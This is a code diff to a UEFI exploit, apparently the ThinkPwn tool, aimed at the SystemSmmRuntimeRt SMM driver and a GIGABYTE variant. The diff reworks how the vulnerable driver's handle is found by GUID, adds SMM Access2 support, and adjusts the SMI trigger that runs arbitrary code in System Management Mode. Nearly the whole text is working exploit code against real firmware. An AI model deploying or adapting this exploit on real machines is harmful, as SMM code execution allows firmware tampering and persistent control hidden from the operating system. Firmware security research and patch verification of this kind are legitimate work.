@@ -17,6 +17,7 @@
 
 #include <Protocol/SmmBase.h>
 #include <Protocol/SmmAccess.h>
+#include <Protocol/SmmAccess2.h>
 #include <Protocol/LoadedImage.h>
 #include <Protocol/SimpleFileSystem.h>
 
@@ -24,23 +25,23 @@
 
 #include "hexdump.h"
 
-// image name for original SystemSmmRuntimeRt UEFI driver
-#define OLD_IMAGE_NAME {    \
-    0x7C79AC8C, 0x5E6C, 0x4E3D,	\
-    { 0xBA, 0x6F, 0xC2, 0x60, 0xEE, 0x7C, 0x17, 0x2E }  \
-}
-// image name for newer SmmRuntime UEFI driver
-#define NEW_IMAGE_NAME {    \
-    0xA56897A1, 0xA77F, 0x4600,	\
-    { 0x84, 0xDB, 0x22, 0xB0, 0xA8, 0x01, 0xFA, 0x9A }  \
-}
-
 // SMM communication data size
 #define BUFF_SIZE 0x1000
 
 #define MAX_SMRAM_REGIONS   2
 #define MAX_HANDLES         0x10
 #define MAX_PATH            0x200
+
+EFI_GUID g_ImageNames[] = {
+
+    // image name for SystemSmmRuntimeRt UEFI driver
+    { 0x7C79AC8C, 0x5E6C, 0x4E3D, \
+      0xBA, 0x6F, 0xC2, 0x60, 0xEE, 0x7C, 0x17, 0x2E },
+
+    // image name for SmmRuntime UEFI driver from GIGABYTE firmware
+    { 0xA56897A1, 0xA77F, 0x4600,   \
+      0x84, 0xDB, 0x22, 0xB0, 0xA8, 0x01, 0xFA, 0x9A }
+};
 
 /*
     Callback function of SystemSmmRuntimeRt that runs in SMM, a2 argument has 
@@ -89,13 +90,16 @@ VOID SmmHandler(VOID *Context, VOID *Unknown, VOID *Data)
     }
 }
 //--------------------------------------------------------------------------------------
-EFI_STATUS GetImageHandle(const EFI_DEVICE_PATH_PROTOCOL *Path, EFI_HANDLE *HandlesList, UINTN *HandlesListLength)
+EFI_STATUS GetImageHandle(
+    EFI_GUID *NamesList, UINTN NamesListLength,
+    EFI_HANDLE *HandlesList, UINTN *HandlesListLength)
 {
+    EFI_STATUS Status;
     EFI_HANDLE *Buffer = NULL;
-    UINTN BufferSize = 0, HandlesFound = 0, i = 0;    
+    UINTN BufferSize = 0, HandlesFound = 0, i = 0, n = 0;        
 
     // determinate handles buffer size
-    EFI_STATUS Status = gBS->LocateHandle(
+    Status = gBS->LocateHandle(
         ByProtocol,
         &gEfiLoadedImageProtocolGuid,
         NULL,
@@ -133,22 +137,63 @@ EFI_STATUS GetImageHandle(const EFI_DEVICE_PATH_PROTOCOL *Path, EFI_HANDLE *Hand
             if (gBS->HandleProtocol(
                 Buffer[i],
                 &gEfiLoadedImageProtocolGuid, 
-                (VOID *)&LoadedImage) == EFI_SUCCESS)
+                (VOID **)&LoadedImage) == EFI_SUCCESS)
             {
-                if (!memcmp(LoadedImage->FilePath, Path,
-                    (Path->Length[0] & 0xFF) | (Path->Length[1] << 8)))
+                // get and check image path
+                EFI_DEVICE_PATH_PROTOCOL *DevicePath = LoadedImage->FilePath;
+                EFI_DEVICE_PATH_PROTOCOL *PrevDevicePath = DevicePath;
+
+                /*
+                    ConvertDevicePathToText() call was removed for compatibility purposes.
+                    See following for more information:
+
+                    https://github.com/Cr4sh/ThinkPwn/pull/6/files
+                    https://github.com/173210/ThinkPwn/commit/e59ef4b533b45c175538015be1dd6d7916f37721
+                */
+                while (DevicePath && !IsDevicePathEnd(DevicePath)) 
                 {
-                    if (HandlesFound + 1 < *HandlesListLength)
+                    if (DevicePathType(DevicePath) == MEDIA_DEVICE_PATH && 
+                        DevicePathSubType(DevicePath) == MEDIA_PIWG_FW_FILE_DP)
                     {
-                        // image handle was found
-                        HandlesList[HandlesFound] = Buffer[i];
-                        HandlesFound += 1;                        
+                        MEDIA_FW_VOL_FILEPATH_DEVICE_PATH *Path = (MEDIA_FW_VOL_FILEPATH_DEVICE_PATH *)DevicePath;
+
+                        for (n = 0; n < NamesListLength; n += 1)
+                        {
+                            // compare image GUID
+                            if (!memcmp(&Path->FvFileName, &NamesList[n], sizeof(EFI_GUID))) 
+                            {
+                                if (HandlesFound + 1 < *HandlesListLength)
+                                {
+                                    // image handle was found
+                                    HandlesList[HandlesFound] = Buffer[i];
+                                    HandlesFound += 1;                        
+                                }
+                                else
+                                {
+                                    // handles list is full
+                                    Status = EFI_BUFFER_TOO_SMALL;                                
+                                }
+
+                                goto _next_handle;
+                            }
+                        }
                     }
-                    else
+
+                    // advance to next DevicePath node
+                    DevicePath = NextDevicePathNode(DevicePath);
+                    
+                    // if it didn't work (e.g. broken node, length = 0, ...), break
+                    if (DevicePath == PrevDevicePath) 
                     {
-                        // handles list is full
-                        Status = EFI_BUFFER_TOO_SMALL;
+                        break;
                     }
+
+                    PrevDevicePath = DevicePath;
+                }
+_next_handle:
+                if (Status != EFI_SUCCESS)
+                {
+                    break;
                 }
             }
         }
@@ -206,7 +251,7 @@ typedef struct
           return result;
         }
 */
-#define COMMUNICATE_GUID  { 0x1279E288, 0x24CD, 0x47E9, 0x96, 0xBA, 0xD7, 0xA3, 0x8C, 0x17, 0xBD, 0x64 }
+#define COMMUNICATE_GUID { 0x1279E288, 0x24CD, 0x47E9, 0x96, 0xBA, 0xD7, 0xA3, 0x8C, 0x17, 0xBD, 0x64 }
 
 /* 
     This function is doing exact the same as EFI_SMM_BASE_PROTOCOL->Communicate(),
@@ -244,24 +289,6 @@ EFI_STATUS Communicate(EFI_SMM_BASE_PROTOCOL *SmmBase, EFI_HANDLE CallbackHandle
 //--------------------------------------------------------------------------------------
 EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
 {
-    static const MEDIA_FW_VOL_FILEPATH_DEVICE_PATH OldPath = {
-        .Header = {
-            .Type = MEDIA_DEVICE_PATH,
-            .SubType = MEDIA_PIWG_FW_FILE_DP,
-            .Length = { sizeof(OldPath) & 0xFF, sizeof(OldPath) >> 8 }
-        },
-        .FvFileName = OLD_IMAGE_NAME
-    };
-
-    static const MEDIA_FW_VOL_FILEPATH_DEVICE_PATH NewPath = {
-        .Header = {
-            .Type = MEDIA_DEVICE_PATH,
-            .SubType = MEDIA_PIWG_FW_FILE_DP,
-            .Length = { sizeof(NewPath) & 0xFF, sizeof(NewPath) >> 8 }
-        },
-        .FvFileName = NEW_IMAGE_NAME
-    };
-
     EFI_STATUS Status = EFI_SUCCESS;    
     EFI_SMM_BASE_PROTOCOL *SmmBase = NULL;  
 
@@ -276,7 +303,7 @@ EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
     g_SmmHandlerExecuted = 0;
 
     // locate SMM base protocol
-    if ((Status = gBS->LocateProtocol(&gEfiSmmBaseProtocolGuid, NULL, &SmmBase)) != EFI_SUCCESS)
+    if ((Status = gBS->LocateProtocol(&gEfiSmmBaseProtocolGuid, NULL, (VOID **)&SmmBase)) != EFI_SUCCESS)
     {
         printf("ERROR: Unable to locate SMM base protocol: 0x%.8x\n", Status);
         goto _end;
@@ -300,8 +327,8 @@ EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
         We can determinate this handle value using LocateHandle() function of
         EFI_BOOT_SERVICES.
     */
-    if ((GetImageHandle(&OldPath.Header, HandlesList, &HandlesListLength) == EFI_SUCCESS) ||
-        (GetImageHandle(&NewPath.Header, HandlesList, &HandlesListLength) == EFI_SUCCESS))
+    if (GetImageHandle(g_ImageNames, sizeof(g_ImageNames) / sizeof(EFI_GUID), 
+                       HandlesList, &HandlesListLength) == EFI_SUCCESS)
     {
         if (HandlesListLength > 0)
         {
@@ -327,8 +354,11 @@ EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
                 // queue SMM communication call                
                 Status = SmmBase->Communicate(SmmBase, ImageHandle, Data, &DataSize);
 
-                // fire any synchronous SMI to process pending SMM calls and execute arbitrary code
-                FireSynchronousSmi(0, 0);
+                if (g_SmmHandlerExecuted == 0)
+                {
+                    // fire any synchronous SMI to process pending SMM calls and execute arbitrary code
+                    FireSynchronousSmi(0xFF, 0);
+                }
 
                 printf(
                     "   Communicate() returned status 0x%.8x, data size is 0x%x\n", 
@@ -405,9 +435,7 @@ int main(int Argc, char **Argv)
     int Ret = -1;
     char *lpszOutPath = NULL;
     EFI_STATUS Status = EFI_SUCCESS;    
-
-    EFI_SMRAM_DESCRIPTOR SmramMap[MAX_SMRAM_REGIONS];
-    UINTN SmramMapSize = sizeof(SmramMap), i = 0;
+    EFI_SMM_ACCESS_PROTOCOL *SmmAccess = NULL;      
 
     if (Argc >= 2)
     {
@@ -451,41 +479,37 @@ int main(int Argc, char **Argv)
     }
 
     // locate SMM access protocol
-    if ((Status = gBS->LocateProtocol(
-        &gEfiSmmAccessProtocolGuid, NULL,(EFI_SMM_ACCESS_PROTOCOL **) NULL)) == EFI_SUCCESS)
+    if (((Status = gBS->LocateProtocol(&gEfiSmmAccessProtocolGuid, NULL, (VOID **)&SmmAccess)) == EFI_SUCCESS) ||
+    	((Status = gBS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (VOID **)&SmmAccess)) == EFI_SUCCESS))
+
     {
-        EFI_SMM_ACCESS_PROTOCOL *SmmAccess = NULL;
-    }
-    else if ((Status = gBS->LocateProtocol(
-        &gEfiSmmAccess2ProtocolGuid, NULL, (EFI_SMM_ACCESS2_PROTOCOL **) NULL)) == EFI_SUCCESS)
-    {
-        EFI_SMM_ACCESS2_PROTOCOL *SmmAccess = NULL;
+        EFI_SMRAM_DESCRIPTOR SmramMap[MAX_SMRAM_REGIONS];
+        UINTN SmramMapSize = sizeof(SmramMap), i = 0;
+
+        printf("SMM access protocol is at 0x%llx\n", SmmAccess);
+
+        // get SMRAM regions information
+        if ((Status = SmmAccess->GetCapabilities(SmmAccess, &SmramMapSize, SmramMap)) != EFI_SUCCESS)
+        {
+            printf("GetCapabilities() ERROR 0x%.8x\n", Status);
+            goto _end;
+        }
+
+        printf("Available SMRAM regions:\n");
+
+        for (i = 0; i < SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
+        {
+            printf(
+                " * 0x%.8llx:0x%.8llx\n", 
+                SmramMap[i].PhysicalStart,
+                SmramMap[i].PhysicalStart + SmramMap[i].PhysicalSize - 1
+            );
+        }
     }
     else
     {
-        printf("ERROR: Unable to locate SMM access protocol: 0x%.8x\n", Status);
-        goto _end;
-    }
-
-    printf("SMM access protocol is at 0x%llx\n", SmmAccess);
-
-    // get SMRAM regions information
-    if ((Status = SmmAccess->GetCapabilities(SmmAccess, &SmramMapSize, SmramMap)) != EFI_SUCCESS)
-    {
-        printf("GetCapabilities() ERROR 0x%.8x\n", Status);
-        goto _end;
-    }
-
-    printf("Available SMRAM regions:\n");
-
-    for (i = 0; i < SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
-    {
-        printf(
-            " * 0x%.8llx:0x%.8llx\n", 
-            SmramMap[i].PhysicalStart,
-            SmramMap[i].PhysicalStart + SmramMap[i].PhysicalSize - 1
-        );
-    }
+        printf("WARNING: Unable to locate SMM access protocol: 0x%.8x\n", Status);
+    }    
 
     // run exploit
     if (SystemSmmRuntimeRt_Exploit(SmmHandler) == EFI_SUCCESS)
